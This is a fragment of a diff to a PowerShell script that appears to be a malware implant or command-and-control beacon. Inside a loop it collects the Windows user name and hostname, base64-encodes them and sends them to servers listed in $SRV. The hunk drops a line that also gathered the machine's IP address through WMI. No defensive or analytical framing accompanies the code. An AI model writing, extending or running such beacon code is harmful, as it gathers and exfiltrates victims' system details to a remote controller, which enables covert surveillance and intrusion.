@@ -43,8 +43,7 @@ while(1){
     $s_i=0;
     $t0=[system.security.principal.windowsidentity]::GetCurrent().Name;
     $t1=[system.net.dns]::GetHostName();
-    $t2=get-wmiobject Win32_NetworkAdapterConfiguration|where {$_.Ipaddress.length -gt 1};
-    $u=_g $SRV[$s_i] ('i='+(_e ([system.convert]::ToBase64String($x.GetBytes($t0+'|'+$t1+'|'+$t2.ipaddress[0])))));
+    $u=_g $SRV[$s_i] ('i='+(_e ([system.convert]::ToBase64String($x.GetBytes($t0+'|'+$t1)))));
     while(1){
       $b=new-object Collections.ArrayList;
       $s_i=($s_i+1)%$SRV.count;
